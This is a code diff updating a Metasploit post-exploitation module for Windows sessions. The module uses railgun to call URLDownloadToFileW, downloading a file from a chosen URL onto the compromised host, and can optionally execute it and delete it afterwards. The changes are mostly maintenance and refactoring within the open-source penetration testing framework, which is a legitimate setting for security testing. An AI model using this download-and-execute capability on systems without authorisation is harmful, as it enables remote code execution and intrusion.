@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
 
   def initialize(info={})
@@ -30,14 +26,14 @@ class Metasploit3 < Msf::Post
         OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
         OptBool.new(  'OUTPUT',        [true, 'Show execution output', true ]),
         OptBool.new(  'EXECUTE',       [true, 'Execute file after completion', false ]),
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
-        OptInt.new('EXEC_TIMEOUT',     [true, 'Execution timeout', 60 ]),
+        OptInt.new(   'EXEC_TIMEOUT',  [true, 'Execution timeout', 60 ]),
         OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
-      ], self.class)
+      ])
 
   end
 
@@ -45,7 +41,7 @@ class Metasploit3 < Msf::Post
 
   def add_railgun_urlmon
 
-    if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
+    if client.railgun.libraries.find_all {|d| d.first == 'urlmon'}.empty?
       session.railgun.add_dll('urlmon','urlmon')
       session.railgun.add_function(
         'urlmon', 'URLDownloadToFileW', 'DWORD',
@@ -76,16 +72,16 @@ class Metasploit3 < Msf::Post
     url = datastore["URL"]
     filename = datastore["FILENAME"] || url.split('/').last
 
-    download_path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"])
-    if download_path.nil? or download_path.empty?
-      path = session.fs.file.expand_path("%TEMP%")
+    path = datastore['DOWNLOAD_PATH']
+    if path.blank?
+      path = session.sys.config.getenv('TEMP')
     else
-      path = download_path
+      path = session.fs.file.expand_path(path)
     end
 
     outpath = path + '\\' + filename
     exec = datastore['EXECUTE']
-    exec_string = datastore['EXEC_STRING'] || ''
+    exec_string = datastore['EXEC_STRING']
     output = datastore['OUTPUT']
     remove = datastore['DELETE']
 
@@ -108,11 +104,7 @@ class Metasploit3 < Msf::Post
     # Execute file upon request
     if exec
       begin
-        cmd = "#{outpath} #{exec_string}"
-
-        # If we don't have the following gsub, we get this error in Windows:
-        # "Operation failed: The system cannot find the file specified"
-        cmd = cmd.gsub(/\\/, '\\\\\\').gsub(/\s/, '\ ')
+        cmd = "\"#{outpath}\" #{exec_string}"
 
         print_status("Executing file: #{cmd}")
         res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
